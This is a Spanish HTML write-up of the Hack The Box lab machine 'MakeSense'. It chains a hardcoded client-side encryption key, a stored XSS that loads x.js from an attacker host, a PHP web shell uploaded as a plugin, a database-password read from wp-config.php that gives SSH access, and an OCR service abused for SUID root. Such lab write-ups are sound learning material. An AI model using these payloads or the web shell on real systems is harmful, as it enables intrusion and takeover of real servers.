@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MakeSense HTB – Guía de Explotación</title>
+    <style>
+        /* Reset & base */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background-color: #0b0e14;
+            color: #d4d4d4;
+            font-family: 'Fira Code', 'Consolas', 'Monaco', monospace;
+            line-height: 1.6;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        /* Banner */
+        .banner {
+            width: 100%;
+            margin-bottom: 1.5rem;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #2c3e50;
+        }
+        .banner img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Header */
+        header {
+            border-bottom: 2px solid #2ecc71;
+            padding-bottom: 1.5rem;
+            margin-bottom: 2.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            flex-wrap: wrap;
+        }
+        header h1 {
+            color: #2ecc71;
+            font-size: 2.2rem;
+            letter-spacing: -1px;
+        }
+        header h1 small {
+            font-size: 1rem;
+            color: #8e8e8e;
+            letter-spacing: 0;
+            margin-left: 0.5rem;
+        }
+        .badge {
+            background: #1e2a36;
+            padding: 0.4rem 1rem;
+            border-radius: 20px;
+            color: #b0b0b0;
+            font-size: 0.9rem;
+            border: 1px solid #2ecc71;
+        }
+
+        /* Navigation */
+        nav {
+            background: #141a22;
+            padding: 0.8rem 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 2rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+            border-left: 4px solid #2ecc71;
+        }
+        nav a {
+            color: #b0b0b0;
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.2s;
+        }
+        nav a:hover {
+            color: #2ecc71;
+        }
+
+        /* Steps */
+        .step {
+            background: #12181f;
+            border-radius: 10px;
+            padding: 1.8rem 2rem;
+            margin-bottom: 2.5rem;
+            border-left: 4px solid #2ecc71;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+        }
+        .step h2 {
+            color: #2ecc71;
+            font-size: 1.6rem;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .step h2 .step-num {
+            background: #2ecc71;
+            color: #0b0e14;
+            font-size: 1rem;
+            padding: 0.1rem 0.7rem;
+            border-radius: 30px;
+        }
+        .step .meta {
+            color: #8e8e8e;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+        }
+        .step p {
+            margin-bottom: 1rem;
+        }
+        .step ul, .step ol {
+            margin: 0.8rem 0 1.2rem 1.8rem;
+        }
+        .step li {
+            margin-bottom: 0.4rem;
+        }
+        .step code {
+            background: #1e2a36;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            color: #f1c40f;
+            font-size: 0.9rem;
+        }
+        .step .cmd-block {
+            background: #0b0e14;
+            border: 1px solid #2c3e50;
+            border-radius: 6px;
+            padding: 1rem 1.2rem;
+            margin: 0.8rem 0 1.2rem 0;
+            overflow-x: auto;
+            font-size: 0.9rem;
+            color: #c5c8c6;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .step .cmd-block .prompt {
+            color: #2ecc71;
+        }
+        .step .highlight {
+            color: #f1c40f;
+        }
+        .step .warn {
+            color: #e67e22;
+        }
+        .step .danger {
+            color: #e74c3c;
+        }
+        .step .success {
+            color: #2ecc71;
+        }
+
+        /* Code snippets */
+        .code-snip {
+            background: #0b0e14;
+            border: 1px solid #2c3e50;
+            border-radius: 6px;
+            padding: 1rem 1.2rem;
+            margin: 0.8rem 0 1.2rem 0;
+            overflow-x: auto;
+            font-size: 0.85rem;
+            color: #c5c8c6;
+        }
+        .code-snip .comment { color: #7f8c8d; }
+        .code-snip .keyword { color: #8be9fd; }
+        .code-snip .string { color: #f1c40f; }
+        .code-snip .func { color: #50fa7b; }
+
+        .redacted {
+            background: #2c3e50;
+            color: #e74c3c;
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 0.85rem;
+        }
+
+        /* Footer */
+        footer {
+            border-top: 1px solid #2c3e50;
+            padding-top: 2rem;
+            margin-top: 2rem;
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+        footer a {
+            color: #2ecc71;
+            text-decoration: none;
+        }
+
+        /* cosmenoide dev link */
+        .cosmenoide-link {
+            display: inline-block;
+            color: #2ecc71;
+            font-weight: bold;
+            text-decoration: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .cosmenoide-link:hover {
+            color: #ffffff;
+            background-color: #2ecc71;
+            transform: scale(1.1);
+            box-shadow: 0 0 15px rgba(46, 204, 113, 0.5);
+        }
+
+        /* Responsive */
+        @media (max-width: 700px) {
+            header { flex-direction: column; align-items: flex-start; gap: 0.5rem; }
+            .step { padding: 1.2rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- Banner -->
+    <div class="banner">
+        <img src="makesense.png" alt="MakeSense Banner">
+    </div>
+
+    <header>
+        <h1>◈ MakeSense <small>Linux · Medium · HTB Season 11</small></h1>
+        <span class="badge">🔒 Sensitive data redacted</span>
+    </header>
+
+    <nav>
+        <a href="#enum">Enumeration</a>
+        <a href="#crypto">Crypto Key</a>
+        <a href="#xss">XSS &amp; Admin</a>
+        <a href="#rce">RCE via Plugin</a>
+        <a href="#lateral">Lateral Move</a>
+        <a href="#priv">Privilege Escalation</a>
+        <a href="#logic">Exploit Logic</a>
+    </nav>
+
+    <!-- STEP 1 -->
+    <section id="enum" class="step">
+        <h2><span class="step-num">1</span> Recon &amp; WordPress Discovery</h2>
+        <div class="meta">🔍 Nmap · Gobuster · WPScan</div>
+        <p>Un escaneo inicial revela solo los puertos <code>80</code> y <code>443</code>, con redirección a HTTPS. El servidor ejecuta <strong>WordPress 7.0</strong> con el tema personalizado <code>webagency</code>.</p>
+        <p>Durante el fuzzing se encuentran:</p>
+        <ul>
+            <li><code>/wp-content/uploads/</code> → listado de directorios habilitado</li>
+            <li><code>/wp-content/themes/webagency/</code> → código fuente del tema accesible</li>
+        </ul>
+        <p>La inspección del tema revela un sistema de <strong>grabación de voz</strong> que utiliza el modelo Whisper (Transformers.js) en el cliente.</p>
+        <div class="cmd-block">
+            <span class="prompt">$</span> nmap -p- --open -sS -min-rate 5000 10.129.29.150 -Pn
+            <span class="prompt">$</span> gobuster dir -u https://makesense.htb -w /usr/share/wordlists/common.txt -k -t 50
+            <span class="prompt">$</span> wpscan --url https://makesense.htb --disable-tls-checks --enumerate u,vp,vt
+        </div>
+        <p><span class="success">▶</span> Se identifican los usuarios <code>walter</code>, <code>admin</code> y <code>jake</code>.</p>
+    </section>
+
+    <!-- STEP 2 -->
+    <section id="crypto" class="step">
+        <h2><span class="step-num">2</span> Clave de cifrado expuesta</h2>
+        <div class="meta">🔑 Hardcoded AES-GCM key en JavaScript</div>
+        <p>El archivo <code>/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js</code> contiene una clave de cifrado estática:</p>
+        <div class="code-snip">
+            <span class="comment">// Symmetric encryption key (must match server-side)</span>
+            <span class="keyword">const</span> ENCRYPTION_KEY = <span class="string">'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'</span>;
+        </div>
+        <p>El flujo de la aplicación:</p>
+        <ul>
+            <li>El cliente graba audio → se transcribe con Whisper → se genera un resumen.</li>
+            <li>El payload (<code>{transcription, summary}</code>) se cifra con AES-GCM usando esa clave.</li>
+            <li>El backend (vía <code>admin-ajax.php?action=save_voice_results</code>) descifra y guarda el resultado <strong>sin sanitizar</strong>.</li>
+        </ul>
+        <p><span class="danger">⚡</span> <strong>Vulnerabilidad:</strong> Podemos cifrar cualquier payload y enviarlo al backend; el contenido se almacenará tal cual.</p>
+        <p>Esto permite inyectar código JavaScript (XSS) o código PHP directamente en el campo <code>transcription</code>.</p>
+    </section>
+
+    <!-- STEP 3 -->
+    <section id="xss" class="step">
+        <h2><span class="step-num">3</span> XSS → Creación de usuario administrador</h2>
+        <div class="meta">🧨 Inyección de script mediante la funcionalidad de voz</div>
+        <p>Se construye un payload cifrado que contiene una etiqueta <code>&lt;script&gt;</code> con un código JavaScript malicioso.</p>
+        <div class="code-snip">
+            <span class="comment">// Fragmento del payload inyectado</span>
+            payload = {
+                <span class="string">"transcription"</span>: <span class="string">'&lt;script src="http://&lt;attacker_ip&gt;:8000/x.js"&gt;&lt;/script&gt;'</span>,
+                <span class="string">"summary"</span>: <span class="string">"s"</span>
+            };
+            <span class="comment">// Se cifra con la clave extraída y se envía a admin-ajax.php</span>
+        </div>
+        <p>El script externo (<code>x.js</code>) realiza lo siguiente:</p>
+        <ul>
+            <li>Obtiene el nonce de creación de usuario desde <code>/wp-admin/user-new.php</code>.</li>
+            <li>Envía una petición POST para crear un nuevo usuario con rol <strong>administrator</strong>.</li>
+        </ul>
+        <p>Cuando el bot administrador visita la página que contiene el comentario malicioso, el XSS se ejecuta y el usuario <code>pwn</code> es creado.</p>
+        <div class="cmd-block">
+            <span class="prompt">$</span> python3 exploit.py 10.129.29.150
+            <span class="comment"># El script automatiza todo el proceso, incluido el servidor HTTP para servir x.js</span>
+        </div>
+        <p><span class="success">✔</span> Usuario <code>pwn</code> con contraseña <span class="redacted">[REDACTED]</span> creado.</p>
+    </section>
+
+    <!-- STEP 4 -->
+    <section id="rce" class="step">
+        <h2><span class="step-num">4</span> Ejecución remota de comandos (RCE)</h2>
+        <div class="meta">⚙️ Subida de plugin malicioso vía panel de administración</div>
+        <p>Con el usuario <code>pwn</code> ya logueado, se accede al panel de WordPress y se sube un plugin ZIP que contiene un simple web shell:</p>
+        <div class="code-snip">
+            <span class="comment">// wshell/wshell.php</span>
+            <span class="keyword">&lt;?php</span>
+            <span class="keyword">if</span>(<span class="func">isset</span>($_REQUEST[<span class="string">'c'</span>])) {
+                <span class="func">echo</span> <span class="string">'&lt;pre&gt;'</span>;
+                <span class="func">system</span>($_REQUEST[<span class="string">'c'</span>]);
+                <span class="func">echo</span> <span class="string">'&lt;/pre&gt;'</span>;
+            }
+            <span class="keyword">?&gt;</span>
+        </div>
+        <p>La subida se realiza usando el formulario de instalación de plugins (<code>/wp-admin/plugin-install.php?tab=upload</code>). Una vez instalado, se puede ejecutar cualquier comando vía:</p>
+        <div class="cmd-block">
+            <span class="prompt">$</span> curl -k "https://makesense.htb/wp-content/plugins/wshell/wshell.php?c=id"
+        </div>
+        <p><span class="success">✔</span> Se obtiene salida de <code>id</code> como <code>www-data</code>, confirmando RCE.</p>
+    </section>
+
+    <!-- STEP 5 -->
+    <section id="lateral" class="step">
+        <h2><span class="step-num">5</span> Movimiento lateral – credenciales SSH</h2>
+        <div class="meta">🔐 Lectura de wp-config.php y extracción de contraseña</div>
+        <p>Desde el shell RCE se lee el archivo <code>/var/www/html/wp-config.php</code> para obtener las credenciales de la base de datos.</p>
+        <div class="code-snip">
+            <span class="comment">// Extracción de la contraseña</span>
+            define( <span class="string">'DB_PASSWORD'</span>, <span class="string">'[REDACTED]'</span> );
+        </div>
+        <p>La contraseña de la base de datos resulta ser la misma que la del usuario <strong>walter</strong> del sistema. Con estas credenciales se logra acceso por SSH:</p>
+        <div class="cmd-block">
+            <span class="prompt">$</span> sshpass -p '<span class="redacted">[REDACTED]</span>' ssh walter@10.129.29.150
+            <span class="prompt">$</span> cat ~/user.txt
+            <span class="highlight">[REDACTED_USER_FLAG]</span>
+        </div>
+        <p><span class="success">✔</span> Flag de usuario obtenida.</p>
+    </section>
+
+    <!-- STEP 6 -->
+    <section id="priv" class="step">
+        <h2><span class="step-num">6</span> Escalada de privilegios vía OCR interno</h2>
+        <div class="meta">🖼️ Abuso del servicio OCR para ejecutar código como root</div>
+        <p>El sistema ejecuta un servicio PHP en el puerto <code>127.0.0.1:8001</code> que realiza OCR (reconocimiento óptico de caracteres) sobre imágenes y guarda el texto extraído en archivos dentro del directorio web.</p>
+        <ul>
+            <li>El servicio está corriendo como <strong>root</strong>.</li>
+            <li>Podemos subir una imagen que contenga código PHP claramente legible.</li>
+            <li>El OCR extraerá ese texto y lo guardará en un archivo <code>.php</code>.</li>
+            <li>Al acceder a ese archivo, el código se ejecutará con privilegios de root.</li>
+        </ul>
+        <p>Se genera una imagen con el siguiente contenido:</p>
+        <div class="code-snip">
+            <span class="keyword">&lt;?php</span> <span class="func">system</span>(<span class="string">'chmod +s /bin/bash'</span>); <span class="keyword">?&gt;</span>
+        </div>
+        <p>La imagen se envía al OCR, que la procesa y guarda el texto en un archivo, por ejemplo, <code>/var/www/html/saved/pwn.php</code>.</p>
+        <p>Al ejecutar <code>https://makesense.htb/saved/pwn.php</code>, se otorgan permisos SUID a <code>/bin/bash</code>.</p>
+        <div class="cmd-block">
+            <span class="prompt">$</span> /bin/bash -p
+            <span class="prompt">#</span> cat /root/root.txt
+            <span class="highlight">[REDACTED_ROOT_FLAG]</span>
+        </div>
+        <p><span class="success">✔</span> Flag de root obtenida.</p>
+    </section>
+
+    <!-- EXPLICACIÓN DETALLADA DE LA LÓGICA DEL EXPLOIT -->
+    <section id="logic" class="step" style="border-left-color: #8e44ad;">
+        <h2>🧩 Lógica del exploit paso a paso</h2>
+        <div class="meta">Cómo se construyó el ataque completo</div>
+
+        <p><strong>Objetivo:</strong> Obtener ejecución de comandos como root en el servidor.</p>
+
+        <ol style="list-style-type: decimal; padding-left: 1.2rem;">
+            <li><strong>Enumeración de superficie:</strong> Se detecta WordPress 7.0 con el tema <code>webagency</code>, que incluye funcionalidad de transcripción de voz mediante Whisper.</li>
+            <li><strong>Extracción de la clave de cifrado:</strong> El archivo <code>whisper-wrapper.js</code> contiene una clave AES-GCM hardcodeada. Esto permite cifrar payloads arbitrarios que el backend descifrará y almacenará sin validación.</li>
+            <li><strong>Inyección de XSS persistente:</strong> Se envía un payload cifrado que contiene una etiqueta <code>&lt;script&gt;</code> que carga un archivo JS desde nuestro servidor. El backend guarda este script en el contenido de un post de WordPress (a través de la acción <code>save_voice_results</code>).</li>
+            <li><strong>Creación de usuario administrador:</strong> El script JS inyectado, al ser ejecutado por el bot administrador cuando visita la página, realiza una petición a <code>/wp-admin/user-new.php</code> con el nonce correspondiente y crea un usuario con rol <code>administrator</code>.</li>
+            <li><strong>Subida de plugin malicioso:</strong> Con el usuario administrador recién creado, se accede al panel de WordPress y se sube un plugin ZIP que contiene un web shell simple (<code>wshell.php</code>). Esto otorga ejecución remota de comandos como <code>www-data</code>.</li>
+            <li><strong>Extracción de credenciales:</strong> Desde el shell RCE, se lee <code>/var/www/html/wp-config.php</code> y se extrae la contraseña de la base de datos, que es reutilizada por el usuario del sistema <code>walter</code>.</li>
+            <li><strong>Acceso SSH:</strong> Con las credenciales de <code>walter</code>, se establece una conexión SSH y se lee la flag de usuario.</li>
+            <li><strong>Detección del servicio OCR interno:</strong> Se observa que en el puerto <code>127.0.0.1:8001</code> corre un servicio PHP que realiza OCR sobre imágenes y guarda el texto extraído en archivos ejecutables dentro del directorio web.</li>
+            <li><strong>Escalada por OCR:</strong> Se genera una imagen con el texto <code>&lt;?php system('chmod +s /bin/bash'); ?&gt;</code>. Se envía al servicio OCR, que procesa la imagen y guarda el código PHP en un archivo accesible desde la web.</li>
+            <li><strong>Ejecución como root:</strong> Al acceder a ese archivo PHP, se ejecuta el comando <code>chmod +s /bin/bash</code>, otorgando permisos SUID a la shell. Luego, con <code>/bin/bash -p</code> se obtiene una shell con privilegios de root y se lee la flag final.</li>
+        </ol>
+
+        <p><span class="success">💡</span> <strong>Clave del éxito:</strong> La combinación de una clave de cifrado expuesta, la capacidad de inyectar XSS persistente, y el uso de un servicio OCR mal configurado que guarda archivos ejecutables en la raíz web.</p>
+        <p>El script completo de Python (disponible en este repositorio) automatiza todas estas fases, incluyendo la generación de la imagen OCR, la interacción con el servicio interno y la recolección de flags.</p>
+    </section>
+
+    <!-- Conclusión -->
+    <section class="step" style="border-left-color: #8e44ad;">
+        <h2>🔮 Conclusión y lecciones</h2>
+        <ul>
+            <li><strong>Claves hardcodeadas</strong> en el lado cliente permiten cifrar payloads arbitrarios y engañar al backend.</li>
+            <li>El <strong>XSS persistente</strong> sigue siendo un vector crítico cuando se combina con funcionalidades "legítimas".</li>
+            <li>Un servicio <strong>OCR que guarda archivos ejecutables</strong> es una puerta abierta a la escalada de privilegios.</li>
+            <li>La <strong>automatización</strong> (con Python) no solo ahorra tiempo, sino que obliga a comprender cada paso y a documentar el ataque.</li>
+        </ul>
+        <p>El código completo del exploit (adaptado) está disponible en este repositorio, pero <span class="warn">las flags y contraseñas han sido redactadas</span> por razones obvias.</p>
+        <p style="margin-top: 1rem;"><span class="success">🛠️</span> <strong>Herramientas utilizadas:</strong> nmap, gobuster, wpscan, curl, sshpass, Python (requests, cryptography, PIL).</p>
+    </section>
+
+    <footer>
+        <p>
+            Guía para fines educativos ·
+            <a href="https://github.com/tu-usuario/MakeSense-walkthrough" target="_blank">Ver en GitHub</a> ·
+            <a href="https://linktr.ee/cosmenoide" target="_blank" class="cosmenoide-link">cosmenoide dev</a>
+        </p>
+    </footer>
+
+</div>
+</body>
+</html>
